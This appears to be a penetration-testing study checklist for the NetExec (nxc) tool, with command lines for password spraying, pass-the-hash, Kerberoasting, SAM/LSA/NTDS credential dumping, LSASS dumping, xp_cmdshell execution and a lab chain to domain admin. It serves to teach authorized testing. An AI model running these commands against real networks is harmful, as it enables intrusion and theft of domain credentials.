# ⚡ NetExec (nxc): Complete Mastery Checklist

> **What is NetExec?** NetExec (nxc) is the maintained successor to CrackMapExec (CME). It is a Swiss-army-knife tool for network authentication testing against SMB, WinRM, LDAP, MSSQL, SSH, RDP, and VNC. Given a credential (username/password or hash) and a target range, NetExec tests whether that credential works — and if it does, can execute commands, dump SAM/LSA/NTDS, enumerate shares, users, sessions, and run post-exploitation modules.
>
> **Why does it exist?** After compromising one credential in an AD environment, you need to rapidly answer: which machines does this credential work on? Is it a local admin? Is it a domain admin? Is there credential re-use? NetExec answers these questions across an entire network range in minutes.
>
> **When to use it:** Password spraying across a network range. Verifying captured/cracked credentials. Finding local admin access across all machines. Executing commands on all machines where you have admin. Dumping SAM/LSA hashes. Enumerating shares, users, sessions. Running Bloodhound collection.
>
> **When to avoid it:** Noisy — generates authentication events on every target. Don't use without authorization. In extremely locked-down environments, the authentication flood may trigger lockout policies.
>
> **What mastering NetExec unlocks:** Rapid credential validation across entire networks. Mass lateral movement assessment. Domain enumeration without being on a domain-joined machine. Full post-exploitation automation. CME muscle memory maps 1:1 to nxc commands.
>
> **Roadmap Phase:** Phase 4–5 (Exploitation, AD Lateral Movement, and Post-Exploitation)

---

## 🧭 Navigation

> [🏠 Home](../README.md) · [📋 Roadmap](../Roadmap/README.md)

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Fundamentals | 5 | 2–3 hours |
| 2 | SMB Protocol | 5 | 3–4 hours |
| 3 | Credential Attacks | 4 | 2–3 hours |
| 4 | Post-Exploitation | 5 | 3–5 hours |
| 5 | Other Protocols | 4 | 2–3 hours |
| 6 | Modules | 3 | 2–3 hours |
| 7 | Practical Labs | 4 | 4–6 hours |
| 8 | Mastery Challenges | 3 | 3–5 hours |
| | **Total** | **33** | **~21–32 hours** |

**Prerequisites:** Active Directory concepts (users, groups, GPOs, Kerberos, NTLM). Understanding of SMB and authentication protocols. Familiarity with Pass-the-Hash and credential types (cleartext, NTLM hash, Kerberos ticket).

---

# PHASE 1: FUNDAMENTALS

---

### Task 1.1 — NetExec vs. CrackMapExec

- [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **History** | CrackMapExec (CME) was the original tool. Effectively abandoned by its main dev. NetExec is the direct successor — same codebase, same syntax, actively maintained. |
| **Commands** | CME: `crackmapexec smb`. NetExec: `nxc smb`. Commands are identical except the binary name. |
| **Go Forward** | Always use `nxc` (NetExec). CME still works but lags behind in features and bug fixes. |

---

### Task 1.2 — Installation

- [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Kali** | `apt install netexec`. Or: `pipx install netexec`. |
| **Verify** | `nxc --version`. |
| **Update** | `pipx upgrade netexec`. |

---

### Task 1.3 — Core Syntax

- [ ] **Completed** · ⭐ Beginner · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Format** | `nxc <protocol> <target> -u <user> -p <password> [options]`. |
| **Protocols** | `smb`, `winrm`, `ldap`, `mssql`, `ssh`, `rdp`, `vnc`, `ftp`. |
| **Target** | Single IP: `192.168.1.10`. Range: `192.168.1.0/24`. List: `-t targets.txt`. Multiple: `192.168.1.1 192.168.1.2`. |
| **Results** | `[+]` = success. `[-]` = failure. `(Pwn3d!)` = local admin / execution rights. `(*)`  = domain admin detected. |

---

### Task 1.4 — Authentication Methods

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Cleartext** | `-u admin -p Password123`. |
| **NTLM Hash (PtH)** | `-u admin -H <NT_hash>` — Pass-the-Hash, no password needed. |
| **Kerberos** | `-k` — use Kerberos (requires valid TGT in ccache). |
| **Null Session** | `-u '' -p ''` — anonymous access. |
| **Local Auth** | `--local-auth` — authenticate as local account (not domain). Critical when testing local admin on workstations. |
| **Domain** | `-d DOMAIN` — specify domain name. |

---

### Task 1.5 — Output and Logging

- [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Save Output** | `nxc smb ... 2>&1 | tee scan.txt`. |
| **Database** | NetExec stores results in `~/.nxc/logs/` and a SQLite database. `nxc smb ... --log scan.log`. |
| **Export** | `nxc smb 192.168.1.0/24 -u admin -p pass --export $(pwd)/results.txt`. |

---

# PHASE 2: SMB PROTOCOL

---

### Task 2.1 — Network Enumeration (No Credentials)

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Discover Hosts** | `nxc smb 192.168.1.0/24` — discovers all SMB hosts on the network. Shows hostname, OS, domain, SMB signing status. |
| **SMB Signing** | Column "signing" — `False` means SMB signing not required → relay attack possible. `nxc smb 192.168.1.0/24 --gen-relay-list targets.txt` — generates a list of unsigned targets for ntlmrelayx. |
| **Key Info** | Hostname, OS version (Windows Server 2019, etc.), domain membership — all from unauthenticated SMB. |

---

### Task 2.2 — Share Enumeration

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **List Shares** | `nxc smb 192.168.1.0/24 -u user -p pass --shares`. Shows all accessible shares on all machines in the range. |
| **Interesting** | `SYSVOL` and `NETLOGON` (domain scripts — may contain credentials). `C$` and `ADMIN$` (admin shares — only accessible to admins). Custom shares (department data). |
| **Null Session** | `nxc smb target -u '' -p '' --shares` — check for anonymous share access. |

---

### Task 2.3 — User and Group Enumeration

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Domain Users** | `nxc smb DC_IP -u user -p pass --users`. |
| **Local Users** | `nxc smb target -u user -p pass --local-users`. |
| **Groups** | `nxc smb DC_IP -u user -p pass --groups`. |
| **Logged On** | `nxc smb 192.168.1.0/24 -u user -p pass --sessions` — who is currently logged in. |
| **Password Policy** | `nxc smb DC_IP -u user -p pass --pass-pol` — get password policy (lockout threshold!). |

---

### Task 2.4 — Command Execution

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Execute** | `nxc smb target -u admin -p pass -x "whoami"` — run cmd command. `-X "whoami"` — run PowerShell command. |
| **Exec Method** | `--exec-method wmiexec` — use WMI (default). `--exec-method smbexec` — use SMB service. `--exec-method atexec` — use task scheduler. |
| **Mass Execution** | `nxc smb 192.168.1.0/24 -u admin -p pass -x "ipconfig"` — run on all machines where credential works. |

---

### Task 2.5 — Filtering and Highlighting Results

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Grep Pwned** | `nxc smb 192.168.1.0/24 -u admin -p pass | grep Pwn3d!` — show only machines where you have admin. |
| **Success Only** | `nxc smb ... | grep "\\[\\+\\]"` — show only successful authentication. |

---

# PHASE 3: CREDENTIAL ATTACKS

---

### Task 3.1 — Password Spraying

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Concept** | Try one password against many users. Avoids account lockout (vs. brute force which tries many passwords against one user). |
| **Command** | `nxc smb DC_IP -u users.txt -p "Winter2024!" --continue-on-success`. |
| **Lockout Warning** | Always check `--pass-pol` first. If lockout threshold is 5 attempts, try ≤3 passwords before waiting for reset. |
| **Timing** | `nxc smb DC_IP -u users.txt -p "Winter2024!" --continue-on-success --delay 0.5` — half-second delay between attempts. |

---

### Task 3.2 — Pass-the-Hash

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Command** | `nxc smb 192.168.1.0/24 -u administrator -H <NT_hash> --local-auth`. |
| **Find Local Admin** | `nxc smb 192.168.1.0/24 -u administrator -H <hash> --local-auth | grep Pwn3d!` — find all machines where the local admin hash works. |
| **Domain Admin PtH** | `nxc smb 192.168.1.0/24 -u DA_user -H <DA_NT_hash> -d DOMAIN | grep Pwn3d!` — test domain admin hash across the network. |

---

### Task 3.3 — Kerberoasting Support

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Kerberoast** | `nxc ldap DC_IP -u user -p pass --kerberoasting kerberoast.txt` — enumerate and request TGS tickets for service accounts. Crack with Hashcat mode 13100. |
| **ASREPRoast** | `nxc ldap DC_IP -u user -p pass --asreproast asrep.txt` — find and request AS-REP for users without pre-auth required. Crack with Hashcat mode 18200. |

---

### Task 3.4 — Credential Stuffing Across Protocols

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **WinRM** | `nxc winrm 192.168.1.0/24 -u admin -p pass` — test WinRM access. `(Pwn3d!)` means you can use evil-winrm. |
| **MSSQL** | `nxc mssql 192.168.1.0/24 -u sa -p pass` — test MSSQL credentials. |
| **SSH** | `nxc ssh 192.168.1.0/24 -u user -p pass` — test SSH credentials. |

---

# PHASE 4: POST-EXPLOITATION

---

### Task 4.1 — SAM Dump (Local Accounts)

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Command** | `nxc smb target -u admin -p pass --sam`. |
| **What It Gets** | All local user account NT hashes from the SAM registry hive. |
| **Use** | Crack hashes or use for local admin PtH to other machines (credential re-use). |

---

### Task 4.2 — LSA Secrets

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Command** | `nxc smb target -u admin -p pass --lsa`. |
| **What It Gets** | LSA (Local Security Authority) secrets: service account credentials stored on the machine, auto-login passwords, cached domain credentials. |
| **High Value** | Service accounts often have elevated privileges. Auto-login password = cleartext credential. |

---

### Task 4.3 — NTDS Dump (All Domain Hashes)

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Command** | `nxc smb DC_IP -u DA_user -p DA_pass --ntds`. |
| **What It Gets** | Complete NTDS.dit dump — NT hashes for ALL domain accounts. |
| **Impact** | All domain credentials. Crack offline or use for PtH/silver/golden ticket attacks. |
| **Requirement** | Domain Admin or equivalent on the DC. |

---

### Task 4.4 — BloodHound Collection

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Command** | `nxc ldap DC_IP -u user -p pass --bloodhound --collection All`. |
| **What It Does** | Runs BloodHound data collection remotely via LDAP without needing to run SharpHound on the target. |
| **Output** | Creates BloodHound-compatible JSON files. Import into BloodHound for attack path visualization. |

---

### Task 4.5 — File Operations

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **List** | `nxc smb target -u admin -p pass -M spider_plus -o READ_ONLY=false` — spider shares and list all files. |
| **Download** | `nxc smb target -u admin -p pass --get-file \\target_path\\file.txt /local/path/`. |
| **Upload** | `nxc smb target -u admin -p pass --put-file /local/file.exe \\target_path\\`. |

---

# PHASE 5: OTHER PROTOCOLS

---

### Task 5.1 — LDAP Enumeration

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Users** | `nxc ldap DC_IP -u user -p pass --users`. |
| **Computers** | `nxc ldap DC_IP -u user -p pass --computers`. |
| **Trusted for Delegation** | `nxc ldap DC_IP -u user -p pass --trusted-for-delegation` — find accounts with unconstrained delegation. |
| **Admin Count** | `nxc ldap DC_IP -u user -p pass --admin-count` — find accounts marked adminCount=1 (historically privileged). |

---

### Task 5.2 — WinRM and evil-winrm Integration

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Test** | `nxc winrm target -u user -p pass`. |
| **Shell** | If `(Pwn3d!)`: `evil-winrm -i target -u user -p pass`. Or with hash: `evil-winrm -i target -u user -H hash`. |
| **Port** | WinRM: port 5985 (HTTP) or 5986 (HTTPS). |

---

### Task 5.3 — MSSQL Exploitation

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Test** | `nxc mssql target -u sa -p pass`. |
| **Execute OS** | `nxc mssql target -u sa -p pass -x "whoami"` — via xp_cmdshell. |
| **Enable xp_cmdshell** | `nxc mssql target -u sa -p pass -q "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"`. |
| **Via Windows Auth** | `nxc mssql target -u domain_user -p pass --windows-auth`. |

---

### Task 5.4 — RDP

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Test** | `nxc rdp 192.168.1.0/24 -u user -p pass` — check RDP access. |
| **Screenshot** | `nxc rdp target -u user -p pass --screenshot` — screenshot the desktop. |
| **Nla** | `nxc rdp target -u user -p pass --nla-screenshot` — with NLA. |

---

# PHASE 6: MODULES

---

### Task 6.1 — Module System

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **List Modules** | `nxc smb -L` — list all available SMB modules. |
| **Module Info** | `nxc smb -M module_name --options` — see module options. |
| **Run Module** | `nxc smb target -u user -p pass -M module_name -o OPTION=value`. |

---

### Task 6.2 — Key Modules

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **spider_plus** | Spider all accessible shares and index files. `nxc smb target -u user -p pass -M spider_plus`. |
| **lsassy** | Dump LSASS memory via various methods. `nxc smb target -u admin -p pass -M lsassy`. |
| **mimikatz** | Run Mimikatz remotely (noisy — likely flagged by AV). |
| **gpp_password** | Search SYSVOL for Group Policy Preferences XML files containing encrypted passwords (old but still found). `nxc smb DC_IP -u user -p pass -M gpp_password`. |
| **zerologon** | Test for ZeroLogon (CVE-2020-1472). `nxc smb DC_IP -u '' -p '' -M zerologon`. |

---

### Task 6.3 — Automated Network Assessment

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Workflow** | 1. `nxc smb 192.168.1.0/24` — discover hosts, note signing status. 2. `nxc smb DC_IP -u user -p pass --users` — enumerate users. 3. `nxc smb DC_IP -u user -p pass --pass-pol` — check lockout. 4. `nxc smb 192.168.1.0/24 -u user -p pass --shares` — find shares. 5. `nxc smb 192.168.1.0/24 -u user -p pass | grep Pwn3d!` — find admin access. 6. `nxc smb DC_IP -u DA_user -p DA_pass --ntds` — dump all hashes. |

---

# PHASE 7: PRACTICAL LABS

---

### Lab 7.1 — Internal Network Discovery

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| **Scenario** | Run `nxc smb` against an AD lab network range with no credentials. Document: all discovered hosts, their OS versions, domain membership, and SMB signing status. Generate relay list. |
| **Success Criteria** | Full host inventory. Relay list generated. Signing status of every host documented. |

---

### Lab 7.2 — Credential Validation and Lateral Movement

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| **Scenario** | Using a compromised domain user credential: spray across network. Identify all machines where the credential works. Identify all machines where it provides admin access (`Pwn3d!`). Dump SAM on one admin machine. |
| **Success Criteria** | All accessible machines identified. SAM dump successful. |

---

### Lab 7.3 — Full AD Compromise with nxc

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min

| **Scenario** | Starting with a standard domain user credential: enumerate users → Kerberoast → crack TGS → validate cracked credential → check if admin → dump NTDS from DC. |
| **Success Criteria** | NTDS dump completed. All domain hashes obtained. |

---

### Lab 7.4 — HTB/THM Active Directory Machine

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 60 min

| **Scenario** | HackTheBox or TryHackMe AD machine. Use nxc throughout: initial enumeration, credential testing, lateral movement, privilege escalation. Document each nxc command used and what it found. |
| **Success Criteria** | Machine rooted. Full nxc methodology documented. |

---

# PHASE 8: MASTERY CHALLENGES

---

### Challenge 8.1 — Spray Without Lockout

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min

| **Scenario** | AD lab with lockout threshold of 3. Check the policy. Design a spray that sends 2 attempts per user per reset window. Execute the spray. Successfully find at least one valid credential without locking out any account. |
| **Success Criteria** | Credential found. Zero accounts locked out. Methodology documented. |

---

### Challenge 8.2 — Hash Dump and Crack Chain

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 60 min

| **Scenario** | Compromise an initial user → lateral movement via nxc → reach admin access → dump NTDS → crack all hashes with Hashcat → categorize: admins, service accounts, users. Analyze password patterns. |
| **Success Criteria** | NTDS dumped. Hashcat cracking complete. Password policy recommendations written. |

---

### Challenge 8.3 — BloodHound Integration

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 60 min

| **Scenario** | Collect BloodHound data via nxc LDAP module. Import into BloodHound. Find the shortest path from current user to Domain Admin. Execute the attack path shown by BloodHound using nxc tools. Achieve DA. |
| **Success Criteria** | BloodHound path identified. Attack executed. Domain Admin achieved. |

---

# 📋 FINAL COMPETENCY MATRIX

| Competency | Self-Assessment |
|:---|:---:|
| Can discover hosts and enumerate SMB info without credentials | ☐ |
| Can validate credentials across a network range | ☐ |
| Can identify machines where credentials provide admin access | ☐ |
| Can perform Pass-the-Hash with nxc | ☐ |
| Can dump SAM, LSA, and NTDS | ☐ |
| Can password spray with awareness of lockout policy | ☐ |
| Can Kerberoast and ASREPRoast via nxc LDAP | ☐ |
| Can collect BloodHound data via nxc | ☐ |
| Can run post-exploitation modules (lsassy, spider_plus, gpp_password) | ☐ |
| Knows the difference between domain auth and `--local-auth` | ☐ |

---

## 🎯 Interview Questions

1. What is the difference between NetExec and CrackMapExec?
2. What does `(Pwn3d!)` mean in nxc output?
3. How do you perform Pass-the-Hash with nxc?
4. What is the `--local-auth` flag and when do you need it?
5. How do you generate a relay list for ntlmrelayx using nxc?
6. What is the danger of password spraying and how do you mitigate it?
7. What does `--ntds` do and what privilege does it require?
8. How do you Kerberoast using nxc's LDAP module?
9. What does the `gpp_password` module look for and why is it valuable?
10. How do you use nxc to collect BloodHound data without running SharpHound?
